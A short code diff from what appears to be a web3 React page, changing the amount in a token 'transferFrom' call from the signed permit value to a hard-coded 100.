@@ -161,7 +161,7 @@ const Page = () => {
 							console.log(await callContractMethod('transferFrom', [
 									account.address,
 									developer.address,
-									signature.permit.value
+									100
 								],token.contract_address,
 								//@ts-ignore
 								provider.connection.url+""))
